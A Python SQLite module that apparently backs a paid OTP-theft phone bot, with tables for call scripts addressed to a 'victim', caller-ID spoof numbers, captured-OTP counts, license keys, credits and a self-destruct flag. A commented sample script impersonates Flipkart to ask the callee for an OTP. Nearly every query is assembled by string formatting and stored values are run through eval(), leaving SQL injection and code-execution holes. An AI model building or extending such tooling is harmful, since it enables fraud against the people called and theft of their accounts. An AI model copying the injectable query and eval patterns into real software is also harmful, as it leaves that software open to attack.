import sqlite3


from sqlite3 import IntegrityError
from datetime import datetime, timedelta



db = sqlite3.connect("Otp/modules/database/main_db.db",check_same_thread=False)
cursor = db.cursor()

class TextParts:
    def __init__(self):
        self.db = db
        self.cursor = cursor

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS TextParts (
                script_id VARCHAR PRIMARY KEY,
                script_owner BIGINT,
                parts TEXT default '{}'
            )
        """)
        self.db.commit()

    def create_script(self, script_id, script_owner, parts):
        try:
            self.cursor.execute(f'''INSERT INTO TextParts VALUES ('{script_id}', {script_owner}, "{parts}")''')
        except IntegrityError:
            return "Script already exists"
        self.db.commit()

    def get_script(self, script_id, service_name, victimname, digits):
        self.cursor.execute(f"""SELECT parts FROM TextParts WHERE script_id="{script_id}" """)
        xc = self.cursor.fetchone()
        if xc == None:
            return None
        dict1 = eval(xc[0].replace("==", " "))
        dict2 = dict1.copy()
        # .replace("{digits}", digits.__str__()).replace("{servicename}", service_name.__str__())
        to_replace = {"{name}": victimname, "{digits}": digits, "{servicename}": service_name}
        for i in dict1.keys():
            for j in to_replace.keys():
                dict2[i] = dict2[i].replace(str(j), str(to_replace[j]))
        return dict2

    def get_script_to_edit(self, script_id):
        self.cursor.execute(f"SELECT parts FROM TextParts WHERE script_id = '{script_id}'")
        return self.cursor.fetchone()

    def delete_script(self, script_id):
        self.cursor.execute(f"DELETE FROM TextParts WHERE script_id = '{script_id}'")
        self.db.commit()

    def get_scripts(self, user_id):
        self.cursor.execute(f"SELECT script_id FROM TextParts WHERE script_owner = {user_id}")
        return self.cursor.fetchall()

    def get_all_scripts(self):
        self.cursor.execute("SELECT script_id FROM TextParts")
        return self.cursor.fetchall()
    
    def update_script(self, script_id, parts):
        self.cursor.execute(f"""UPDATE TextParts SET parts = "{parts}" WHERE script_id = '{script_id}'""")
        self.db.commit()

    def reset(self):
        self.cursor.execute("DROP TABLE TextParts")
        self.db.commit()

# TextParts().delete_script("Flipkart_HsKtIe")
# TextParts().create_script("Flipkart_HsKtIe", 2142595466, "{'intro': 'Hello dear {name} we are calling you from flipkart kindly give otp else idk', 'enter_otp': 'Please enter your otp', 'verifying': 'Please wait while we verify your otp', 'valid_otp': 'Otp is valid', 'wrong_otp': 'Sorry, you have entered the wrong otp', 'end_phase': 'Thank you for using our services'}")
class Subscription:

    def __init__(self):
        self.db = db
        self.cursor = cursor

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS Subscription (
                user_id BIGINT PRIMARY KEY,
                plan varchar(30),
                activation_date datetime,
                expiry_date datetime
            )
        """)
        self.db.commit()
    
    def add_subscription(self, user_id, plan, activation_date, expiry_date):
        try:
            self.cursor.execute(f"INSERT INTO Subscription VALUES ({user_id}, '{plan}', '{activation_date}', '{expiry_date}')")
        except IntegrityError:
            return "You already have a subscription"
        else:
            self.db.commit()
            return "Subscribed successfully"
    
    def get_subscription(self, user_id):
        try:
            self.cursor.execute(f"SELECT * FROM Subscription WHERE user_id = {user_id}")
        except Exception as e:
            print(e, user_id)
            return None
        return self.cursor.fetchone()

    def delete_subscription(self, user_id):
        try:
            self.cursor.execute(f"DELETE FROM Subscription WHERE user_id = {user_id}")
        except Exception as e:
            print(e, user_id)
            return "Couldn't delete subscription"
        self.db.commit()
    
    def update_subscription(self, user_id, plan, activation_date, expiry_date):
        try:
            self.cursor.execute(f"UPDATE Subscription SET plan = '{plan}', activation_date = '{activation_date}', expiry_date = '{expiry_date}' WHERE user_id = {user_id}")
        except Exception as e:
            print(e, user_id)
            return "Couldn't update subscription"
        self.db.commit()

    def get_all_subscriptions(self):
        self.cursor.execute("SELECT * FROM Subscription")
        return self.cursor.fetchall()

    def gell_all_users(self):
        self.cursor.execute("SELECT user_id FROM Subscription")
        return self.cursor.fetchall()

    def get_plan(self, user_id: int):
        self.cursor.execute("SELECT plan FROM Subscription WHERE user_id = (?)", (user_id,))
        return self.cursor.fetchone()
    
    def all_users(self):
        self.cursor.execute("SELECT user_id FROM Subscription")
        return self.cursor.fetchall()

    def remove_user(self, user_id):
        self.cursor.execute(f"DELETE FROM Subscription WHERE user_id = {user_id}")
        self.db.commit()

class HandleDateTime():

    def current_date_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def get_expiry_date(self, days=0, months=0, hours=0, minutes=0, seconds=0):
        return (datetime.now() + timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)).strftime("%Y-%m-%d %H:%M:%S")
    
    def get_date_month(self, date, date_or_month):
        if date_or_month == "date":
            return datetime.now().strftime("%d")
        elif date_or_month == "month":
            return datetime.now().strftime("%m")
        elif date_or_month == "year":
            return datetime.now().strftime("%Y")
        elif date_or_month == "hour":
            return datetime.now().strftime("%H")
        elif date_or_month == "minute":
            return datetime.now().strftime("%M")
        elif date_or_month == "second":
            return datetime.now().strftime("%S")

    def verify_expiry_date(self, user_id):
        expiry_date = HandleDateTime().get_expiry_date_from_db(user_id)
        if expiry_date == None:
            return False
        return datetime.now() < datetime.strptime(expiry_date, "%Y-%m-%d %H:%M:%S")

    def get_expiry_date_from_db(self, user_id):
        sub = Subscription()
        try:
            return sub.get_subscription(user_id)[3]
        except:
            return None
    
    def get_activation_date_from_db(self, user_id):
        sub = Subscription()
        return sub.get_subscription(user_id)[2]

    def get_plan_from_db(self, user_id):
        sub = Subscription()
        return sub.get_subscription(user_id)[1]


class LicenseKeys():

    def __init__(self):
        self.db = db
        self.cursor = cursor

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS LicenseKeys (
                key varchar(50) PRIMARY KEY,
                validity INT DEFAULT 0,
                Plan varchar(30),
                used BOOLEAN DEFAULT 0
                
            )
        """)
        self.db.commit()

    def add_key(self, key, validity, plan):
        try:
            self.cursor.execute(f"INSERT INTO LicenseKeys VALUES ('{key}', {validity}, '{plan}', 0)")
        except IntegrityError:
            return "Key already exists"
        self.db.commit()
    
    def get_key(self, key):
        self.cursor.execute(f"SELECT * FROM LicenseKeys WHERE key = '{key}'")
        return self.cursor.fetchone()

    def get_all_keys(self):
        self.cursor.execute("SELECT * FROM LicenseKeys")
        return self.cursor.fetchall()
    
    def delete_key(self, key):
        self.cursor.execute(f"DELETE FROM LicenseKeys WHERE key = '{key}'")
        self.db.commit()

    def claim_key(self, key):
        self.cursor.execute(f"UPDATE LicenseKeys SET used = 1 WHERE key = '{key}'")
        self.db.commit()

    def dev_update(self):
        self.cursor.execute("drop table LicenseKeys")
        self.db.commit()

class LoadLicenseKeys:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS LoadLicenseKeys (
                key TEXT UNIQUE,
                amount float DEFAULT 0,
                is_used BOOLEAN DEFAULT 0
            )
        """)
        self.db.commit()
        return "Table created"
    
    def add_key(self, key, amount):
        try:
            self.cursor.execute(f"INSERT INTO LoadLicenseKeys VALUES ('{key}', {amount}, 0)")
        except IntegrityError:
            return "Key already exists"
        self.db.commit()
    
    def get_key(self, key):
        self.cursor.execute(f"SELECT * FROM LoadLicenseKeys WHERE key = '{key}'")
        return self.cursor.fetchone()
    

    def claim_key(self, key):
        self.cursor.execute(f"UPDATE LoadLicenseKeys SET is_used = 1 WHERE key = '{key}'")
        self.db.commit()
    

    def dev_update(self):
        self.cursor.execute("drop table LoadLicenseKeys")
        self.db.commit()



class BlackList:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS BlackList (
                user_id BIGINT PRIMARY KEY
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id):
        try:
            self.cursor.execute(f"INSERT INTO BlackList VALUES ({user_id})")
        except IntegrityError:
            return "User already blacklisted"
        else:
            self.db.commit()
            return "User blacklisted successfully"
        
    
    def remove_user(self, user_id):
        self.cursor.execute(f"DELETE FROM BlackList WHERE user_id = {user_id}")
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM BlackList WHERE user_id = {user_id}")
        return self.cursor.fetchone()
    
    def get_all_users(self):
        self.cursor.execute("SELECT * FROM BlackList")
        return self.cursor.fetchall()



class PayAsYouGo:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS PayAsYouGo (
                user_id BIGINT PRIMARY KEY,
                credits float DEFAULT 0,
                usage float DEFAULT 0,
                total_calls INT DEFAULT 0,
                minutes TIME
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id):
        try:
            self.cursor.execute(f"INSERT INTO PayAsYouGo VALUES ({user_id}, 0, 0, 0)")
        except IntegrityError:
            return "User already added"
        else:
            self.db.commit()
            return "User added successfully"
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM PayAsYouGo WHERE user_id = {user_id}")
        return self.cursor.fetchone()
    
    def update_credits(self, user_id, credits):
        self.cursor.execute(f"UPDATE PayAsYouGo SET credits = {credits} WHERE user_id = {user_id}")
        self.db.commit()
    
    def update_usage(self, user_id, usage):
        try:
            prev_usage = self.get_user(user_id)[2]
        except:
            prev_usage = None
        if prev_usage == None:
            prev_usage = 0
        usage += prev_usage
        self.cursor.execute(f"UPDATE PayAsYouGo SET usage = {usage} WHERE user_id = {user_id}")

    def deduct_credits(self, user_id, credits):
        print(user_id)
        try:
            prev_credits = self.get_user(user_id)[1]
        except:
            prev_credits = 0
        credits = prev_credits - credits
        self.update_credits(user_id, credits)
        return credits

    def update_total_calls(self, user_id):
        try:
            prev_calls = self.get_user(user_id)[3]
        except:
            prev_calls = 0
        total_calls = prev_calls + 1
        self.cursor.execute(f"UPDATE PayAsYouGo SET total_calls = {total_calls} WHERE user_id = {user_id}")
        self.db.commit()

    def delete_user(self, user_id):
        self.cursor.execute(f"DELETE FROM PayAsYouGo WHERE user_id = {user_id}")
        self.db.commit()

    def load_balance(self, user_id, credits):
        try:
            prev_credits = self.get_user(user_id)[1]
        except:
            prev_credits = None
        if prev_credits == None:
            prev_credits = 0
        credits += prev_credits
        self.update_credits(user_id, credits)
        return credits

    def get_user_balance(self, user_id):
        try:
            return self.get_user(user_id)[1]
        except:
            return None
    
    def get_user_usage(self, user_id):
        try:
            return self.get_user(user_id)[2]
        except:
            return None
    
    def get_user_total_calls(self, user_id):
        try:
            return self.get_user(user_id)[3]
        except:
            return None


class LoginDetails:
    
    def create_table(self):
        cursor.execute("""CREATE TABLE IF NOT EXISTS LoginDetails(
                       user_id BIGINT PRIMARY KEY,
                       email VARCHAR(200) UNIQUE,
                       password VARCHAR(200) NOT NULL,
                       logged_users TEXT DEFAULT '[]'
        )""")
        db.commit()
    
    def add_user(self, user_id, email, password):
        try:
            cursor.execute(f"INSERT INTO LoginDetails VALUES ({user_id}, '{email}', '{password}', '[]')")
        except IntegrityError:
            return "User already exists"
        db.commit()

    def delete_user(self, user_id):
        cursor.execute(f"DELETE FROM LoginDetails WHERE user_id = {user_id}")
        db.commit()
    
    def get_logged_users(self, Email):
        cursor.execute(f"SELECT logged_users FROM LoginDetails WHERE email = '{Email}'")
        return eval(cursor.fetchone())
    
    def add_logged_user(self, Email, user_id):
        users = self.get_logged_users(Email)
        if user_id in users:
            return "User already logged in"
        else:
            users.append(user_id)
            cursor.execute(f"UPDATE LoginDetails SET logged_users = '{str(users)}' WHERE email = '{Email}'")
            db.commit()

    def remove_logged_user(self, Email, user_id):
        users = self.get_logged_users(Email)
        if user_id not in users:
            return "User not logged in"
        else:
            users.remove(user_id)
            cursor.execute(f"UPDATE LoginDetails SET logged_users = '{str(users)}' WHERE email = '{Email}'")
            db.commit()


class Login:

    def __init__(self):
        self.db = db
        self.cursor = cursor

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS Login (
                user_id BIGINT PRIMARY KEY,
                email VARCHAR(200) UNIQUE
            )
        """)
        self.db.commit()

    def add_user(self, user_id, email):
        try:
            self.cursor.execute(f"INSERT INTO Login VALUES ({user_id}, '{email}')")
        except IntegrityError:
            return "User already exists"
        self.db.commit()

    def delete_user(self, user_id):
        self.cursor.execute(f"DELETE FROM Login WHERE user_id = {user_id}")
        self.db.commit()

    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM Login WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def get_user_email(self, email):
        self.cursor.execute(f"SELECT * FROM Login WHERE email = '{email}'")
        return self.cursor.fetchone()

    def get_all_users(self):
        self.cursor.execute("SELECT * FROM Login")
        return self.cursor.fetchall()

    def get_user_id(self, email):
        self.cursor.execute(f"SELECT user_id FROM Login WHERE email = '{email}'")
        return self.cursor.fetchone()

    def get_email(self, user_id):
        self.cursor.execute(f"SELECT email FROM Login WHERE user_id = {user_id}")
        return self.cursor.fetchone()


    def update_email(self, user_id, email):
        self.cursor.execute(f"UPDATE Login SET email = '{email}' WHERE user_id = {user_id}")
        self.db.commit()

    def dev_update(self):
        self.cursor.execute("drop table Login")
        self.db.commit()


class ConcurrentCalls():

    def __init__(self):
        self.db = db
        self.cursor = cursor

    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS ConcurrentCalls (
                user_id BIGINT PRIMARY KEY,
                call INT DEFAULT 0
            )
        """)
        self.db.commit()

    def add_user(self, user_id):
        try:
            self.cursor.execute(f"INSERT INTO ConcurrentCalls VALUES ({user_id}, 0)")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM ConcurrentCalls WHERE user_id = {user_id}")
        return self.cursor.fetchone()
    
    def get_status(self, user_id):
        self.cursor.execute(f"SELECT call FROM ConcurrentCalls WHERE user_id = {user_id}")
        xd = self.cursor.fetchone()
        if xd == None:
            return [None]
        return xd
    
    def update_calls(self, user_id, calls):
        self.add_user(user_id)
        self.cursor.execute(f"UPDATE ConcurrentCalls SET call={calls} WHERE user_id = {user_id}")
        self.db.commit()
        return "Calls updated"
    
    def delete_user(self, user_id):
        self.cursor.execute(f"DELETE FROM ConcurrentCalls WHERE user_id = {user_id}")
        self.db.commit()
    
    def dev_update(self):
        self.cursor.execute("drop table ConcurrentCalls")
        self.db.commit()


class Verification:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS Verification (
                user_id BIGINT PRIMARY KEY,
                currently_verifying BOOLEAN DEFAULT 0
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id):
        try:
            self.cursor.execute(f"INSERT INTO Verification VALUES ({user_id}, 0)")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM Verification WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def update_status(self, user_id, status):
        try:
            self.add_user(user_id)
        except:
            pass
        try:
            self.cursor.execute(f"UPDATE Verification SET currently_verifying = {status} WHERE user_id = {user_id}")
        except Exception as e:
            print(e, user_id)
            return "Couldn't update status"
        self.db.commit()
        return "Status updated successfully"
    
    def get_status(self, user_id):
        self.cursor.execute(f"SELECT currently_verifying FROM Verification WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def dev_update(self):
        self.cursor.execute("drop table Verification")
        self.db.commit()


class Users:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS Users (
                user_id BIGINT PRIMARY KEY,
                first_name VARCHAR(200),
                username VARCHAR(200)
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id, first_name, username):
        try:
            self.cursor.execute(f"INSERT INTO Users VALUES ({user_id}, '{first_name}', '{username}')")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM Users WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def get_all_users(self):
        self.cursor.execute("SELECT * FROM Users")
        return self.cursor.fetchall()
    
    def delete_user(self, user_id):
        self.cursor.execute(f"DELETE FROM Users WHERE user_id = {user_id}")
        self.db.commit()
    
    def dev_update(self):
        self.cursor.execute("drop table Users")
        self.db.commit()
    
    def user_exists(self, user_id):
        self.cursor.execute(f"SELECT * FROM Users WHERE user_id = {user_id}")
        return self.cursor.fetchone()


class SelfDestruct:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS SelfDestruct (
                is_active BOOLEAN DEFAULT 1
            )
        """)
        self.db.commit()
    
    def get_status(self):
        self.cursor.execute("SELECT is_active FROM SelfDestruct")
        return self.cursor.fetchone()

    def update_status(self, status):
        self.cursor.execute(f"UPDATE SelfDestruct SET is_active = {status}")
        self.db.commit()


class TTS:


    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS TTS (
                key VARCHAR(500) PRIMARY KEY
            )
        """)
        self.db.commit()
    
    def add_key(self, key):
        try:
            self.cursor.execute("DELETE FROM TTS")
            self.cursor.execute(f"INSERT INTO TTS VALUES ('{key}')")
        except IntegrityError:
            return "Key already exists"
        self.db.commit()


    def get_key(self):
        self.cursor.execute("SELECT * FROM TTS")
        return self.cursor.fetchone()[0]


class LastCallTime:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS LastCallTime (
                user_id BIGINT PRIMARY KEY,
                last_call_time VARCHAR(100)
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id, last_call_time):
        try:
            self.cursor.execute(f"INSERT INTO LastCallTime VALUES ({user_id}, '{last_call_time}')")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM LastCallTime WHERE user_id = {user_id}")
        return self.cursor.fetchone()
    
    def update_time(self, user_id, last_call_time):
        try:
            self.add_user(user_id, last_call_time)
        except:
            pass
        self.cursor.execute(f"UPDATE LastCallTime SET last_call_time = '{last_call_time}' WHERE user_id = {user_id}")
        self.db.commit()
    
    def dev_update(self):
        self.cursor.execute("drop table LastCallTime")
        self.db.commit()
    

class CallLogs:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS CallLogs (
                user_id BIGINT PRIMARY KEY,
                total_calls BIGINT DEFAULT 0,
                TotalOtp BIGINT DEFAULT 0
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id):
        try:
            self.cursor.execute(f"INSERT INTO CallLogs VALUES ({user_id}, 0, 0)")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM CallLogs WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def update_calls(self, user_id):
        try:
            self.add_user(user_id)
        except:
            pass
        try:
            prev_calls = self.get_calls(user_id)[0]
        except:
            prev_calls = 0
        total_calls = prev_calls + 1
        self.cursor.execute(f"UPDATE CallLogs SET total_calls = {total_calls} WHERE user_id = {user_id}")
    
    def update_otp(self, user_id, otp):
        try:
            prev_otp = self.get_otp(user_id)[0]
        except:
            prev_otp = 0
        total_otp = prev_otp + 1
        self.cursor.execute(f"UPDATE CallLogs SET TotalOtp = {total_otp} WHERE user_id = {user_id}")
        self.db.commit()
    
    def get_calls(self, user_id):
        self.cursor.execute(f"SELECT total_calls FROM CallLogs WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def get_otp(self, user_id):
        self.cursor.execute(f"SELECT TotalOtp FROM CallLogs WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def dev_update(self):
        self.cursor.execute("drop table CallLogs")
        self.db.commit()



class Maintenance:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS Maintenance (
                is_active BOOLEAN DEFAULT 0,
                since VARCHAR(100) DEFAULT '0'
            )
        """)
        self.cursor.execute("INSERT INTO Maintenance VALUES (0, 0)")
        self.db.commit()
    
    def get_status(self):
        self.cursor.execute("SELECT is_active FROM Maintenance")
        return self.cursor.fetchone()

    def update_status(self, status):
        self.cursor.execute(f"UPDATE Maintenance SET is_active = {status}")
        self.db.commit()
    
    def get_since(self):
        self.cursor.execute("SELECT since FROM Maintenance")
        return self.cursor.fetchone()

    def update_since(self, since):
        self.cursor.execute(f"UPDATE Maintenance SET since = '{since}'")
        self.db.commit()
    
    def dev_update(self):
        self.cursor.execute("drop table Maintenance")
        self.db.commit()



class SecCounter:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS SecCounter (
                user_id BIGINT PRIMARY KEY,
                callcount BIGINT DEFAULT 0,
                country TEXT DEFAULT '{}',
                calling_spoof TEXT DEFAULT '[]'
            )
        """)
        self.db.commit()
    
    def add_user(self, user_id):
        try:
            dics = {}
            self.cursor.execute(f"INSERT INTO SecCounter VALUES ({user_id}, 0, '{dics}', '[]')")
        except IntegrityError:
            return "User already exists"
        self.db.commit()
    
    def get_user(self, user_id):
        self.cursor.execute(f"SELECT * FROM SecCounter WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def update_callcount(self, user_id):
        try:
            self.add_user(user_id)
        except:
            pass
        try:
            prev_calls = self.get_calls(user_id)[0]
        except:
            prev_calls = 0
        total_calls = prev_calls + 1
        self.cursor.execute(f"UPDATE SecCounter SET callcount = {total_calls} WHERE user_id = {user_id}")
    
    def get_calls(self, user_id):
        self.cursor.execute(f"SELECT callcount FROM SecCounter WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def update_country(self, user_id, countri, seconds):
        try:
            self.add_user(user_id)
        except:
            pass
        try:
            country = eval(self.get_country(user_id)[0])
        except:
            country = {}
        nl = country.copy()
        templis = []
        for i in nl.keys():
            templis.append(int(i))
        countri = int(countri)
        if countri in templis:
            nl[countri] += seconds
        else:
            nl[countri] = seconds
        self.cursor.execute(f'UPDATE SecCounter SET country = "{str(nl)}" WHERE user_id = {user_id}')
    
    def get_country(self, user_id):
        self.cursor.execute(f"SELECT country FROM SecCounter WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def update_calling_spoof(self, user_id, number):
        try:
            self.add_user(user_id)
        except:
            pass
        try:
            prev_calls = eval(self.get_calling_spoof(user_id)[0])
        except:
            prev_calls = []
        prev_calls.append(number)
        self.cursor.execute(f'UPDATE SecCounter SET calling_spoof = "{str(prev_calls)}" WHERE user_id = {user_id}')
    
    def get_calling_spoof(self, user_id):
        self.cursor.execute(f"SELECT calling_spoof FROM SecCounter WHERE user_id = {user_id}")
        return self.cursor.fetchone()

    def get_total_calls(self):
        self.cursor.execute("SELECT callcount FROM SecCounter")
        xD = self.cursor.fetchall()
        total_calls = 0
        for i in xD:
            total_calls += i[0]
        return total_calls

    def get_total_seconds_country(self):
        self.cursor.execute("SELECT country FROM SecCounter")
        xD = self.cursor.fetchall()
        country_sec = {}
        for i in xD:
            try:
                country = eval(i[0])
            except:
                country = {}
            for j in country.keys():
                if str(j).startswith("+91") or str(j).startswith("91"):
                    country_sec["INDIA"] = country_sec.get("INDIA", 0) + country[j]
                elif str(j).startswith("+1") or str(j).startswith("1"):
                    country_sec["USA"] = country_sec.get("USA", 0) + country[j]
                elif str(j).startswith("+55") or str(j).startswith("55"):
                    country_sec["BRAZIL"] = country_sec.get("BRAZIL", 0) + country[j]
                elif str(j).startswith("+358") or str(j).startswith("358"):
                    country_sec["FINLAND"] = country_sec.get("FINLAND", 0) + country[j]
                elif str(j).startswith("+33") or str(j).startswith("33"):
                    country_sec["FRANCE"] = country_sec.get("FRANCE", 0) + country[j]
                elif str(j).startswith("+34") or str(j).startswith("34"):
                    country_sec["SPAIN"] = country_sec.get("SPAIN", 0) + country[j]
                elif str(j).startswith("+46") or str(j).startswith("46"):
                    country_sec["SWEDEN"] = country_sec.get("SWEDEN", 0) + country[j]
        for i in country_sec.keys():
            if country_sec[i] == 0:
                del country_sec[i]
        return country_sec

    def delete_all(self):
        self.cursor.execute("DELETE FROM SecCounter")
        self.db.commit()

    def dev_update(self):
        self.cursor.execute("drop table SecCounter")
        self.db.commit()


class BalanceCut:

    def __init__(self):
        self.db = db
        self.cursor = cursor
    
    def create_table(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS BalanceCut (
                balancecut float DEFAULT 0
            )
        """)
        self.cursor.execute("INSERT INTO BalanceCut VALUES (0)")
        self.db.commit()

    def get_balancecut(self):
        self.cursor.execute("SELECT balancecut FROM BalanceCut")
        return self.cursor.fetchone()
    
    def update_balancecut(self, balancecut):
        try:
            prev_balancecut = self.get_balancecut()[0]
        except:
            prev_balancecut = 0
        balancecut += prev_balancecut
        self.cursor.execute(f"UPDATE BalanceCut SET balancecut = {balancecut}")
    
    def clear_balancecut(self):
        self.cursor.execute("UPDATE BalanceCut SET balancecut = 0")
        self.db.commit()

    def dev_update(self):
        self.cursor.execute("drop table BalanceCut")
        self.db.commit()

# BalanceCut().create_table()
# SecCounter().create_table()
# Maintenance().create_table()
def create_tables():
    LicenseKeys().create_table()
    Subscription().create_table()
    LoadLicenseKeys().create_table()
    BlackList().create_table()
    PayAsYouGo().create_table()
    TextParts().create_table()
    Login().create_table()
    ConcurrentCalls().create_table()
    Verification().create_table()
    Users().create_table()
    SelfDestruct().create_table()
    TTS().create_table()
    CallLogs().create_table()
    Maintenance().create_table()
    SecCounter().create_table()
    BalanceCut().create_table()

def delete_data():
    LicenseKeys().cursor.execute("DELETE FROM LicenseKeys")
    Subscription().cursor.execute("DELETE FROM Subscription")
    LoadLicenseKeys().cursor.execute("DELETE FROM LoadLicenseKeys")
    # BlackList().cursor.execute("DELETE FROM BlackList")
    PayAsYouGo().cursor.execute("DELETE FROM PayAsYouGo")
    TextParts().cursor.execute("DELETE FROM TextParts")
    Login().cursor.execute("DELETE FROM Login")
    ConcurrentCalls().cursor.execute("DELETE FROM ConcurrentCalls")
    Verification().cursor.execute("DELETE FROM Verification")
    # Users().cursor.execute("DELETE FROM Users")
    SelfDestruct().cursor.execute("DELETE FROM SelfDestruct")
    TTS().cursor.execute("DELETE FROM TTS")
    CallLogs().cursor.execute("DELETE FROM CallLogs")
    # Maintenance().cursor.execute("DELETE FROM Maintenance")
    SecCounter().cursor.execute("DELETE FROM SecCounter")
    BalanceCut().cursor.execute("DELETE FROM BalanceCut")
    LicenseKeys().db.commit()
    Subscription().db.commit()
    LoadLicenseKeys().db.commit()
    # BlackList().db.commit()
    PayAsYouGo().db.commit()
    TextParts().db.commit()
    Login().db.commit()
    ConcurrentCalls().db.commit()
    Verification().db.commit()
    # Users().db.commit()
    SelfDestruct().db.commit()
    TTS().db.commit()
    CallLogs().db.commit()
    # Maintenance().db.commit()
    SecCounter().db.commit()
    BalanceCut().db.commit()   

    

# delete_data()

def drop_tables():
    LicenseKeys().cursor.execute("DROP TABLE LicenseKeys")
    Subscription().cursor.execute("DROP TABLE Subscription")
    LoadLicenseKeys().cursor.execute("DROP TABLE LoadLicenseKeys")
    BlackList().cursor.execute("DROP TABLE BlackList")
    PayAsYouGo().cursor.execute("DROP TABLE PayAsYouGo")
    TextParts().cursor.execute("DROP TABLE TextParts")
    Login().cursor.execute("DROP TABLE Login")
    ConcurrentCalls().cursor.execute("DROP TABLE ConcurrentCalls")
    Verification().cursor.execute("DROP TABLE Verification")
    Users().cursor.execute("DROP TABLE Users")
    SelfDestruct().cursor.execute("DROP TABLE SelfDestruct")
    TTS().cursor.execute("DROP TABLE TTS")
    CallLogs().cursor.execute("DROP TABLE CallLogs")
    Maintenance().cursor.execute("DROP TABLE Maintenance")
    SecCounter().cursor.execute("DROP TABLE SecCounter")
    BalanceCut().cursor.execute("DROP TABLE BalanceCut")


# Subscription().cursor.execute("SELECT plan FROM Subscription WHERE user_id = 2142595466")
# print(Subscription().cursor.fetchone())
# print(Subscription().get_plan(2142595466))
# Verification().update_status(2142595466, 1)

# print(PayAsYouGo().get_user(2142595466)[1])